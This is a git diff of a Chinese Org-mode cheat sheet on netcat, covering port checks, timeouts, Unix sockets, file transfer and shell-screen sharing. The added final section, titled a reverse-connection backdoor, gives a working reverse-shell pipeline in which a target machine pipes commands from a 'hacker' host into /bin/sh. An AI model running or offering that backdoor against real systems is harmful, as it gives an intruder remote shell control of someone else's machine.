@@ -1,47 +1,89 @@
-** 如果使用了重定向功能，则为传输文件模式，否则interactive模式
-
-** interactive
-
-一终端开启： =nc -l localhost 2000=
-
-另一终端开启: =nc localhost 2000=
-
-** 检测端口
-
-=nc -z host.example.com 20-30=
-
-** 设置连接timeout
-
-=nc -w 5 localhost 8080=
-
-** 设置本地IP
-
-=nc -s 10.1.2.3 host.example.com 8989=
-
-** Create and listen on a Unix Domain Socket
-
-=nc -lU /var/tmp/dsocket=
-
-client: =nc -U /var/tmp/dsocket=
+#+TITLE:     Netcat
+#+AUTHOR:    Hao Ruan
+#+EMAIL:     ruanhao1116@gmail.com
+#+LANGUAGE:  en
+#+LINK_HOME: http://www.github.com/ruanhao
+#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="../css/style.css" />
+#+OPTIONS:   H:2 num:nil \n:nil @:t ::t |:t ^:{} _:{} *:t TeX:t LaTeX:t
+#+STARTUP:   showall
 
 
-** 传输文件
+* 一，基本用法
 
-nc -v -l 80 < file.ext ## sharing file through http 80 port
+- 服务器端
 
-** 共享屏幕
+  =nc -l <port>=
 
-*** 一对多
-#+BEGIN_SRC
-script -qf | tee >(nc -kl 5000) >(nc -kl 5001) >(nc -kl 5002)
-## run 'nc yourip 5000', 'nc yourip 5001' or 'nc yourip 5002' elsewhere
-## will produce an exact same mirror of your shell.
-## This is handy when you want to show someone else some amazing stuff
-## in your shell without giving them control over it.
-#+END_SRC
+- 客户端
 
-*** 一对一
-#+BEGIN_SRC
-mkfifo foo; script -f foo ## master
-cat foo ## slaver
-#+END_SRC
+  =nc <ip> <port>=
+
+
+* 二，用法示例
+
+- 检测端口
+
+  =nc -w 1 -z <ip> 20-30=
+
+- 设置连接超时
+
+  =nc -w 5 <ip> <port>=
+
+- 指定源 IP
+
+  #+BEGIN_SRC
+  ## -s 指定 src ip
+  nc -s 10.1.2.3 <ip> <port>
+  #+END_SRC
+
+- 使用 Unix Domain Socket
+
+  - 服务器端
+
+    =nc -lU /var/tmp/dsocket=
+
+  - 客户端
+
+    =nc -U /var/tmp/dsocket=
+
+- 传输文件
+
+  #+BEGIN_SRC
+  nc -v -l 8080 < file.txt       ## 服务器端
+  nc <ip>  8080 > save_file.txt  ## 客户端
+
+  nc -v -l 8080 > file.txt       ## 服务器端
+  nc <ip>  8080 < save_file.txt  ## 客户端
+  #+END_SRC
+
+- 共享屏幕
+
+  - 一对多
+
+    #+BEGIN_SRC
+    script -qf | tee >(nc -kl 5000) >(nc -kl 5001) >(nc -kl 5002)
+    ## run 'nc yourip 5000', 'nc yourip 5001' or 'nc yourip 5002' elsewhere
+    ## will produce an exact same mirror of your shell.
+    ## This is handy when you want to show someone else some amazing stuff
+    ## in your shell without giving them control over it.
+    #+END_SRC
+
+  - 一对一
+
+    #+BEGIN_SRC
+    mkfifo foo; script -f foo ## master
+    cat foo ## slaver
+    #+END_SRC
+
+- 反向连接后门
+
+  在 hacker 主机 2345 端口上输入命令，在 2346 端口查看结果
+
+  #+BEGIN_SRC
+  ## hacker
+  nc -l 2345
+  nc -l 2346
+
+  ## target
+  nc <hacker-ip> 2345 | /bin/sh | nc <hacker-ip> 2346
+  #+END_SRC
